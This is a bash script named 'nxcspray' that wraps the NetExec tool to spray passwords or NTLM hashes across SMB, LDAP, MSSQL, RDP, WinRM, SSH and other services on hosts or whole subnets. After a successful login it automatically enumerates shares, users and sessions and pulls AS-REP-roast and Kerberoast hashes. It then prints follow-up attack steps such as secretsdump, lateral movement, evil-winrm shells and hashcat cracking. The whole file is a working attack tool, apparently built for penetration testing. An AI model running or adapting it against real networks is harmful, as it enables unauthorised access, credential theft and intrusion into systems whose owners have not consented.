#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  nxcspray — Multi-protocol credential spray & validator
#  Syntax mirrors nxc: nxcspray <proto[,proto]|all> <target> -u <user> -p <pass>
# ═══════════════════════════════════════════════════════════════

VERSION="1.0.0"

# ── Colors ──────────────────────────────────────────────────────
R=$'\033[0;31m'    BR=$'\033[1;31m'
G=$'\033[0;32m'    BG=$'\033[1;32m'
Y=$'\033[1;33m'    B=$'\033[0;34m'
C=$'\033[0;36m'    BC=$'\033[1;36m'
W=$'\033[1;37m'    DIM=$'\033[2m'
NC=$'\033[0m'

# ── Defaults ────────────────────────────────────────────────────
OUTDIR="./nxcspray_results"
NXC_TIMEOUT=8
KILL_TIMEOUT=3
ENUM_ON_WIN=true
QUIET=false

# Auth — mirrors nxc flags exactly
NXC_USER=""           # -u
NXC_USERS_FILE=""     # -u <file>
NXC_PASS=""           # -p
NXC_PASS_FILE=""      # -p <file>
NXC_HASH=""           # -H
NXC_HASH_FILE=""      # -H <file>
NXC_DOMAIN=""         # -d
LOCAL_AUTH=false      # --local-auth

TARGET=""
TARGETS_FILE=""
PROTO_ARG=""

# ── Banner ──────────────────────────────────────────────────────
banner() {
    echo ""
    echo -e "${W}═══════════════════════════════════════${NC}"
    echo -e "${W}  NXCSPRAY${NC}  ${DIM}v${VERSION}${NC}"
    echo -e "${W}═══════════════════════════════════════${NC}"
    echo ""
    echo -e "${C}         (((("
    echo -e "        (((("
    echo -e "         ))))"
    echo -e "      _ .---."
    echo -e "     ( |\`---'|"
    echo -e "      \\|     |"
    echo -e "      : .___, :"
    echo -e "       \`-----'${NC}"
    echo ""
    echo -e "  ${DIM}Multi-protocol credential spray & validator${NC}"
    echo ""
}

# ── Usage ───────────────────────────────────────────────────────
usage() {
    banner
    echo -e "usage: nxcspray [-h] <protocols|all> <target> -u USER -p PASS [options]"
    echo ""
    echo -e "Multi-Protocol Credential Spray Tool"
    echo ""
    echo -e "positional arguments:"
    echo -e "  protocols             smb,ldap,mssql,rdp,winrm,ftp,ssh,vnc,wmi  or  all"
    echo -e "  target                IP, CIDR, hostname, or file of targets"
    echo ""
    echo -e "auth arguments (same flags as nxc):"
    echo -e "  -u USER|FILE          Username or file of usernames"
    echo -e "  -p PASS|FILE          Password or file of passwords"
    echo -e "  -H HASH|FILE          NTLM hash or file of hashes (pass-the-hash)"
    echo -e "  -d DOMAIN             Domain for authentication"
    echo -e "  --local-auth          Force local authentication"
    echo ""
    echo -e "options:"
    echo -e "  -o DIR                Output directory (default: ./nxcspray_results)"
    echo -e "  --no-enum             Skip auto-enumeration on successful auth"
    echo -e "  -q                    Quiet mode — only show hits"
    echo -e "  -h, --help            Show this help message and exit"
    echo ""
    echo -e "examples:"
    echo -e "  nxcspray all 10.10.10.10 -u admin -p Password123"
    echo -e "  nxcspray smb,rdp,winrm 192.168.1.0/24 -u admin -p Password123"
    echo -e "  nxcspray all hosts.txt -u users.txt -p passes.txt -d corp.local"
    echo -e "  nxcspray smb 10.10.10.10 -u administrator -H aad3b435b51404ee:deadbeef1234"
    echo -e "  nxcspray mssql 10.10.10.10 -u sa -p Password123 --local-auth"
    echo ""
    echo -e "Run 'nxcspray --help' to see this message."
    echo ""
    exit 0
}

# ── Logging ─────────────────────────────────────────────────────
log_hit()     { echo -e "  ${BG}[+]${NC} $*"; }
log_info()    { [[ "$QUIET" == false ]] && echo -e "  ${C}[*]${NC} $*"; }
log_warn()    { echo -e "  ${Y}[!]${NC} $*"; }
log_fail()    { echo -e "  ${R}[-]${NC} $*"; }
log_section() { echo -e "\n  ${W}═══ $* ═══${NC}"; }

# ── Dependency check ────────────────────────────────────────────
check_deps() {
    local missing=()
    for cmd in nxc timeout; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        log_fail "Missing required tools: ${missing[*]}"
        exit 1
    fi
}

# ── Detect whether a -u/-p/-H value is a file or a literal ──────
resolve_up() {
    local flag="$1"   # -u | -p | -H
    local value="$2"
    if [[ -f "$value" ]]; then
        echo "$flag $value"
    else
        echo "$flag '$value'"
    fi
}

# ── Parse args ──────────────────────────────────────────────────
parse_args() {
    if [[ $# -lt 2 ]]; then
        usage
    fi

    PROTO_ARG="$1"
    TARGET_RAW="$2"
    shift 2

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --help)       usage ;;
            -u)           NXC_USER_RAW="$2";  shift 2 ;;
            -p)           NXC_PASS_RAW="$2";  shift 2 ;;
            -H)           NXC_HASH_RAW="$2";  shift 2 ;;
            -d)           NXC_DOMAIN="$2";    shift 2 ;;
            --local-auth) LOCAL_AUTH=true;     shift ;;
            -o)           OUTDIR="$2";         shift 2 ;;
            --no-enum)    ENUM_ON_WIN=false;   shift ;;
            -q)           QUIET=true;          shift ;;
            *)            log_fail "Unknown option: $1 (did you mean --local-auth?)"; usage ;;
        esac
    done

    # Resolve target
    if [[ -f "$TARGET_RAW" ]]; then
        TARGETS_FILE="$TARGET_RAW"
    else
        TARGET="$TARGET_RAW"
    fi

    # Must have -u and either -p or -H
    if [[ -z "$NXC_USER_RAW" ]]; then
        log_fail "No username specified — use -u <user|file>"
        usage
    fi
    if [[ -z "$NXC_PASS_RAW" && -z "$NXC_HASH_RAW" ]]; then
        log_fail "No credential specified — use -p <pass|file> or -H <hash|file>"
        usage
    fi

    # Validate any file paths
    for f in "$TARGETS_FILE" "$NXC_USER_RAW" "$NXC_PASS_RAW" "$NXC_HASH_RAW"; do
        # Only error if the value looks like a path (contains /) or ends in common list extensions
        if [[ -n "$f" && "$f" == */* && ! -f "$f" ]]; then
            log_fail "File not found: $f"
            exit 1
        fi
    done
}

# ── Resolve protocol list ────────────────────────────────────────
get_protocols() {
    if [[ "$PROTO_ARG" == "all" ]]; then
        echo "smb ldap mssql rdp winrm ftp ssh vnc wmi"
    else
        echo "$PROTO_ARG" | tr ',' ' '
    fi
}

# ── Build nxc auth flags (mirrors nxc's own flag style) ─────────
build_auth_flags() {
    local flags=""

    # -u
    flags+=" $(resolve_up "-u" "$NXC_USER_RAW")"

    # -p or -H
    if [[ -n "$NXC_HASH_RAW" ]]; then
        flags+=" $(resolve_up "-H" "$NXC_HASH_RAW")"
    else
        flags+=" $(resolve_up "-p" "$NXC_PASS_RAW")"
    fi

    [[ -n "$NXC_DOMAIN" ]] && flags+=" -d '$NXC_DOMAIN'"

    echo "$flags"
}

# ── Build target string ─────────────────────────────────────────
build_target() {
    if [[ -n "$TARGETS_FILE" ]]; then
        echo "$TARGETS_FILE"
    else
        echo "$TARGET"
    fi
}

# ── Run a single nxc check ──────────────────────────────────────
run_check() {
    local label="$1"
    local proto="$2"
    shift 2
    local extra="$*"
    local target_arg auth_flags

    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)

    log_info "Spraying ${W}${label}${NC}..."

    eval timeout --kill-after="$KILL_TIMEOUT" "$NXC_TIMEOUT" \
        nxc "$proto" "$target_arg" $auth_flags $extra \
        --timeout 5 --dns-timeout 3 \
        2>/dev/null | tee "$OUTDIR/${label}.txt" | while IFS= read -r line; do
            if echo "$line" | grep -q 'Pwn3d!'; then
                echo -e "  ${BR}[ADMIN]${NC} ${W}${label}${NC}: $line"
                echo "$label|ADMIN|$line" >> "$OUTDIR/.hits"
            elif echo "$line" | grep -qE '\(\+\)|STATUS_SUCCESS'; then
                echo -e "  ${BG}[AUTH]${NC}  ${W}${label}${NC}: $line"
                echo "$label|AUTH|$line" >> "$OUTDIR/.hits"
            fi
        done
}

# ── Protocol runners ────────────────────────────────────────────
run_smb() {
    run_check "smb" "smb" &
    [[ "$LOCAL_AUTH" == true ]] && run_check "smb-local" "smb" "--local-auth" &
}
run_ldap()  { run_check "ldap"  "ldap"  & }
run_mssql() {
    run_check "mssql" "mssql" &
    [[ "$LOCAL_AUTH" == true ]] && run_check "mssql-local" "mssql" "--local-auth" &
}
run_rdp()   { run_check "rdp"   "rdp"   & }
run_winrm() { run_check "winrm" "winrm" & }
run_ftp()   { run_check "ftp"   "ftp"   & }
run_ssh()   { run_check "ssh"   "ssh"   & }
run_vnc()   { run_check "vnc"   "vnc"   & }
run_wmi()   { run_check "wmi"   "wmi"   & }

# ── Auto-enumeration ────────────────────────────────────────────
run_smb_enum() {
    local target_arg auth_flags
    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)
    log_info "SMB enum: shares, sessions, users, groups, disks..."
    for action in --shares --sessions --users --groups --disks --loggedon-users; do
        eval timeout --kill-after="$KILL_TIMEOUT" 15 \
            nxc smb "$target_arg" $auth_flags $action \
            --timeout 5 --dns-timeout 3 2>/dev/null \
            >> "$OUTDIR/smb_enum.txt"
    done
    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc smb "$target_arg" $auth_flags --pass-pol \
        --timeout 5 --dns-timeout 3 2>/dev/null \
        >> "$OUTDIR/smb_passpol.txt"
    log_info "SMB enum saved → smb_enum.txt, smb_passpol.txt"
}

run_ldap_enum() {
    local target_arg auth_flags
    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)
    log_info "LDAP enum: users, groups, gmsa, delegation..."
    for action in --users --groups --gmsa --trusted-for-delegation; do
        eval timeout --kill-after="$KILL_TIMEOUT" 15 \
            nxc ldap "$target_arg" $auth_flags $action \
            --timeout 5 --dns-timeout 3 2>/dev/null \
            >> "$OUTDIR/ldap_enum.txt"
    done
    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc ldap "$target_arg" $auth_flags --asreproast "$OUTDIR/asreproast.txt" \
        --timeout 5 --dns-timeout 3 2>/dev/null
    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc ldap "$target_arg" $auth_flags --kerberoasting "$OUTDIR/kerberoast.txt" \
        --timeout 5 --dns-timeout 3 2>/dev/null
    log_info "LDAP enum saved → ldap_enum.txt"
    [[ -s "$OUTDIR/asreproast.txt" ]] && log_hit "ASREPRoastable accounts found! → asreproast.txt"
    [[ -s "$OUTDIR/kerberoast.txt" ]] && log_hit "Kerberoastable accounts found! → kerberoast.txt"
}

run_mssql_enum() {
    local target_arg auth_flags
    target_arg=$(build_target)
    auth_flags=$(build_auth_flags)
    log_info "MSSQL enum: checking privileges..."
    eval timeout --kill-after="$KILL_TIMEOUT" 15 \
        nxc mssql "$target_arg" $auth_flags --priv \
        --timeout 5 --dns-timeout 3 2>/dev/null \
        >> "$OUTDIR/mssql_enum.txt"
    log_info "MSSQL enum saved → mssql_enum.txt"
}

auto_enum() {
    [[ "$ENUM_ON_WIN" == false ]] && return
    [[ ! -f "$OUTDIR/.hits" || ! -s "$OUTDIR/.hits" ]] && return
    log_section "AUTO-ENUMERATION"
    grep -qE '^smb(\-local)?\|' "$OUTDIR/.hits" 2>/dev/null && run_smb_enum
    grep -q  '^ldap|'           "$OUTDIR/.hits" 2>/dev/null && run_ldap_enum
    grep -qE '^mssql(\-local)?\|' "$OUTDIR/.hits" 2>/dev/null && run_mssql_enum
}

# ── Summary ─────────────────────────────────────────────────────
print_summary() {
    echo ""
    echo -e "  ${W}═══════════════════════════════════════════${NC}"
    echo -e "  ${W}  RESULTS SUMMARY${NC}"
    echo -e "  ${W}═══════════════════════════════════════════${NC}"
    echo ""

    if [[ ! -f "$OUTDIR/.hits" || ! -s "$OUTDIR/.hits" ]]; then
        echo -e "  ${R}No successful authentications.${NC}"
    else
        local admin_count auth_count
        admin_count=$(grep -c "|ADMIN|" "$OUTDIR/.hits" 2>/dev/null || echo 0)
        auth_count=$(grep -c  "|AUTH|"  "$OUTDIR/.hits" 2>/dev/null || echo 0)
        echo -e "  ${BG}Authenticated${NC}: $auth_count    ${BR}Admin/Pwn3d${NC}: $admin_count"
        echo ""
        local prev_proto=""
        sort -t'|' -k1 "$OUTDIR/.hits" | while IFS='|' read -r proto level line; do
            if [[ "$proto" != "$prev_proto" ]]; then
                echo -e "  ${BC}── $proto ──${NC}"
                prev_proto="$proto"
            fi
            [[ "$level" == "ADMIN" ]] \
                && echo -e "    ${BR}★${NC} $line" \
                || echo -e "    ${G}✓${NC} $line"
        done
    fi

    echo ""
    echo -e "  ${DIM}Output → $OUTDIR/${NC}"
    local file_count
    file_count=$(find "$OUTDIR" -maxdepth 1 -type f ! -name '.*' 2>/dev/null | wc -l)
    if [[ "$file_count" -gt 0 ]]; then
        echo -e "  ${DIM}Files:${NC}"
        find "$OUTDIR" -maxdepth 1 -type f ! -name '.*' -printf '    %f\n' 2>/dev/null | sort
    fi
    echo ""

    if [[ -f "$OUTDIR/.hits" && -s "$OUTDIR/.hits" ]]; then
        echo -e "  ${Y}Next steps:${NC}"
        grep -q  "^smb.*ADMIN"       "$OUTDIR/.hits" 2>/dev/null && echo "    → SMB admin: secretsdump, SAM dump, lateral movement"
        grep -q  "^winrm|"           "$OUTDIR/.hits" 2>/dev/null && echo "    → WinRM: evil-winrm for interactive shell"
        grep -q  "^rdp|"             "$OUTDIR/.hits" 2>/dev/null && echo "    → RDP: xfreerdp for GUI access"
        grep -qE "^mssql"            "$OUTDIR/.hits" 2>/dev/null && echo "    → MSSQL: impacket-mssqlclient, check xp_cmdshell"
        grep -q  "^ssh|"             "$OUTDIR/.hits" 2>/dev/null && echo "    → SSH: interactive shell access"
        grep -q  "^ldap|"            "$OUTDIR/.hits" 2>/dev/null && echo "    → LDAP: BloodHound collection, further AD enum"
        [[ -s "$OUTDIR/asreproast.txt" ]] && echo "    → ASREPRoast hashes found — crack with hashcat -m 18200"
        [[ -s "$OUTDIR/kerberoast.txt"  ]] && echo "    → Kerberoast hashes found — crack with hashcat -m 13100"
        echo ""
    fi

    rm -f "$OUTDIR/.hits"
}

# ── Main ────────────────────────────────────────────────────────
main() {
    parse_args "$@"
    check_deps
    banner

    mkdir -p "$OUTDIR"
    > "$OUTDIR/.hits"

    local tgt_display usr_display cred_display
    [[ -n "$TARGETS_FILE" ]] && tgt_display="$TARGETS_FILE" || tgt_display="$TARGET"
    usr_display="$NXC_USER_RAW"
    [[ -n "$NXC_HASH_RAW" ]] && cred_display="-H $NXC_HASH_RAW" || cred_display="-p $NXC_PASS_RAW"

    echo -e "  ${W}Protocols${NC}: $(get_protocols | tr ' ' ',')"
    echo -e "  ${W}Target${NC}:    $tgt_display"
    echo -e "  ${W}User${NC}:      -u $usr_display"
    echo -e "  ${W}Cred${NC}:      $cred_display"
    [[ -n "$NXC_DOMAIN" ]]      && echo -e "  ${W}Domain${NC}:   -d $NXC_DOMAIN"
    [[ "$LOCAL_AUTH" == true ]]  && echo -e "  ${W}Local${NC}:    --local-auth"
    echo -e "  ${W}Output${NC}:   $OUTDIR"
    echo ""

    log_section "CREDENTIAL SPRAY"

    for proto in $(get_protocols); do
        case "$proto" in
            smb)   run_smb ;;
            ldap)  run_ldap ;;
            mssql) run_mssql ;;
            rdp)   run_rdp ;;
            winrm) run_winrm ;;
            ftp)   run_ftp ;;
            ssh)   run_ssh ;;
            vnc)   run_vnc ;;
            wmi)   run_wmi ;;
            *)     log_warn "Unknown protocol: $proto" ;;
        esac
    done

    wait

    auto_enum
    print_summary
}

main "$@"
